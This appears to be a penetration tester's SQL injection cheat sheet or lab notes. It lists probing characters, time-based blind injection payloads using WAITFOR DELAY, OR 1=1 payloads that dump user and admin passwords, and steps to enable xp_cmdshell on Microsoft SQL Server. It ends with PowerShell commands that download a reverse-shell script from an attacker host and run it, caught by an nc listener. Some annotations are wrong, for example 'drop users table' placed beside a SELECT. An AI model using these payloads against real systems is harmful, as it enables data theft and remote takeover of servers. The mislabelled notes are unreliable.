- Characters to try for injection:
- `'` MSSQL, MySQL, PostgreSQL, Oracle, SQLite, IBM DB2, Microsoft Access, SAP HANA, MariaDB
	- Hex: `0x22`
	- Unicode: `\u0027`
- `"` MySQL, PostgreSQL, SQLite
- `backtick` MySQL, MariaDB
- `\` MySQL for escaping
- `;` terminate queries for most DBMSs
- `--` comment for MSSQL, MySQL, PostgreSQL, Oracle
- `#` comment for MySQL
`'` in username field leads to error so SQL injection
`'; WAITFOR DELAY '00:00:05'--`
- caused 5 second delay so time-based sql
`' OR 1=1 in (SELECT * FROM users) -- //
- drop users table
`' or 1=1 in (SELECT password FROM users) -- //`
- drop password from users table
`' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //`
- dump admin password

To query database version:
Oracle`SELECT banner FROM v$version   SELECT version FROM v$instance`
Microsoft`SELECT @@version`
PostgreSQL`SELECT version()`
MySQL`SELECT @@version`

Time-based:
`'; IF SUBSTRING(@@version, 1, 1) = 'M' BEGIN WAITFOR DELAY '00:00:03' END; -- -`
- causes delay so we know version starts with M
- There are three DBMSs that I can think of which start with M. So if the above command doesn't make the site hang for three seconds, you can also try `'; IF SUBSTRING(@@version, 1, 2) = 'My' BEGIN WAITFOR DELAY '00:00:03' END; -- -`
	- no delay so not MySQL

`'; IF SUBSTRING(@@version, 1, 9) = 'Microsoft' BEGIN WAITFOR DELAY '00:00:03' END; -- -`
- causes delay so we know its microsoft SQL server
- Now that you know it's Microsoft SQL Server, you can tailor your attack the same way. The training material shows that we can enable xp_cmdshell if it isn't already with this command `'; EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE; EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE; -- -`
- Once that's done, you can execute commands with `'; EXECUTE xp_cmdshell "" -- -` and enter the commands you'd like in the `" "`
	- `'; EXECUTE xp_cmdshell "powershell.exe wget http://192.168.45.210/info.txt -OutFile c:\\Users\Public\\info.txt" -- -`
		 - executes command from sql injected machine to request info.txt from my `python -m http.server 80`
			- should see the request (regardless if the file is there, will get 404)
`'; EXECUTE xp_cmdshell "powershell.exe wget http://192.168.45.248/revshell.ps1 -OutFile c:\\Users\Public\\revshell.ps1" -- -`
- should see request so we know file is uploaded
`'; EXECUTE xp_cmdshell "powershell.exe c:\\Users\Public\\revshell.ps1" -- -`
- will see connection on nc -lvnp 6969
